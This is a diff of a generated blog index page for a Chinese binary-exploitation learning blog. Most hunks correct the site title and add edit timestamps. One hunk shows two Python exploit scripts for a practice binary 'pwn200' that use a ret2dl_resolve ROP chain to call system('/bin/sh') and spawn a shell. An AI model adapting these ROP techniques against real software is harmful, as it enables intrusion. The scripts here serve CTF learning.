@@ -22,9 +22,9 @@
 
   <meta name="description" content="分享一些bin学习日常的菜鸡">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Coldshiel&#39;s blog">
+<meta property="og:title" content="Coldshield&#39;s blog">
 <meta property="og:url" content="http://yoursite.com/index.html">
-<meta property="og:site_name" content="Coldshiel&#39;s blog">
+<meta property="og:site_name" content="Coldshield&#39;s blog">
 <meta property="og:description" content="分享一些bin学习日常的菜鸡">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="Coldshield">
@@ -42,7 +42,7 @@
   };
 </script>
 
-  <title>Coldshiel's blog</title>
+  <title>Coldshield's blog</title>
   
 
 
@@ -94,7 +94,7 @@
     <div>
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Coldshiel's blog</span>
+        <span class="site-title">Coldshield's blog</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -192,7 +192,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coldshiel's blog">
+      <meta itemprop="name" content="Coldshield's blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -206,10 +206,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-04-08 05:07:36 / Modified: 05:08:18" itemprop="dateCreated datePublished" datetime="2020-04-08T05:07:36-07:00">2020-04-08</time>
+              <time title="Created: 2020-04-08 05:07:36" itemprop="dateCreated datePublished" datetime="2020-04-08T05:07:36-07:00">2020-04-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-04-09 18:14:38" itemprop="dateModified" datetime="2020-04-09T18:14:38-07:00">2020-04-09</time>
+              </span>
 
           
   
@@ -319,7 +325,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">"system\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>这里使用到了roputils</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">r = process(<span class="string">'./pwn200'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./pwn200'</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>) <span class="comment">#返回地址处自动加上了有ppp_ret的地址</span></span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base) <span class="comment"># dl_resolve_call第一个参数是Elf32_Rel的base，用来填上fake Rel结构体偏移的 第二个是*args，执行dl_resolve_call时函数的参数</span></span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>) <span class="comment"># /bin/sh是system参数</span></span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>) <span class="comment"># 这里同时填上了Elf32_Rel结构体和Elf32_sym结构体（base+20对应前面的base+20，注意这里的）</span></span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">r = process(<span class="string">'./pwn200'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./pwn200'</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>) <span class="comment">#返回地址处自动加上了有ppp_ret的地址</span></span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base) <span class="comment"># dl_resolve_call第一个参数是Elf32_Rel的base，用来填上fake Rel结构体偏移的 第二个是*args，执行dl_resolve_call时函数的参数</span></span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>) <span class="comment"># /bin/sh是system参数</span></span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>) <span class="comment"># 这里同时填上了Elf32_Rel结构体和Elf32_sym结构体（base+20对应前面的base+20，注意）</span></span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>不过在布置base的时候需要注意一下bss的内容还有一些对齐操作，必要时调试观察+修改一下base</p>
 <hr>
@@ -357,7 +363,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coldshiel's blog">
+      <meta itemprop="name" content="Coldshield's blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -481,7 +487,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coldshiel's blog">
+      <meta itemprop="name" content="Coldshield's blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -633,7 +639,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coldshiel's blog">
+      <meta itemprop="name" content="Coldshield's blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -739,7 +745,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coldshiel's blog">
+      <meta itemprop="name" content="Coldshield's blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -999,7 +1005,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coldshiel's blog">
+      <meta itemprop="name" content="Coldshield's blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -1101,7 +1107,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coldshiel's blog">
+      <meta itemprop="name" content="Coldshield's blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -1216,7 +1222,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coldshiel's blog">
+      <meta itemprop="name" content="Coldshield's blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -1346,7 +1352,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coldshiel's blog">
+      <meta itemprop="name" content="Coldshield's blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -1491,7 +1497,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coldshiel's blog">
+      <meta itemprop="name" content="Coldshield's blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
